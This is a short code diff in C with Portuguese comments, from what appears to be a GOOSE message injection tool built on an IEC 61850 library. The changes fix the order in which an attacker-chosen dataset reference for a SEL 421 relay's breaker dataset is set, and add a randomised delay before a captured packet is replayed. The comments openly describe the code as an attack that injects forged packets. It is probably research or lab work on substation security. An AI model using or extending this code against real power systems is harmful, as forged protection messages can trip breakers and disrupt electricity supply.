@@ -174,12 +174,13 @@ main(int argc, char** argv)
                 else
                     interface = "3";
 
-                //Valor do dataset a ser atacado determinado pelo atacante
-                GoosePublisher_setDataSetRef(publicador, "SEL_421_distCFG/LLN0$dataset_disj");
+                
 
 
                 //Inserção dos valores retirados do pacote original no pacote de ataque a ser injetado
                 GoosePublisher publicador = GoosePublisher_create(&gooseCommParameters, interface);
+                //Valor do dataset a ser atacado determinado pelo atacante - ATUALIZAÇÃO
+                GoosePublisher_setDataSetRef(publicador, "SEL_421_distCFG/LLN0$dataset_disj");
                 GoosePublisher_setGoCbRef(publicador, goCbRef);
                 GoosePublisher_setConfRev(publicador, confRev);
                 GoosePublisher_setGoID(publicador, goId);
@@ -195,7 +196,7 @@ main(int argc, char** argv)
 
                 //Definicao do tempo para o pacote capturado ser retransmitido, pode ser gerado aleatoriamento dentro de um intervalo ou em um tempo especifico definido pelo atacante
                 //No caso foi gerado aleatoriamento dentro de um intervalo
-                int intervalo_sup_sleep = 10000, intervalo_inf_sleep = 1000;
+                int intervalo_sup_sleep = 10000, intervalo_inf_sleep = 1000, intervalo_sleep =0;
                 intervalo_sleep = (rand() % (intervalo_sup_sleep - intervalo_inf_sleep + 1) + intervalo_inf_sleep);
                 Thread_sleep(intervalo_sleep);
                 
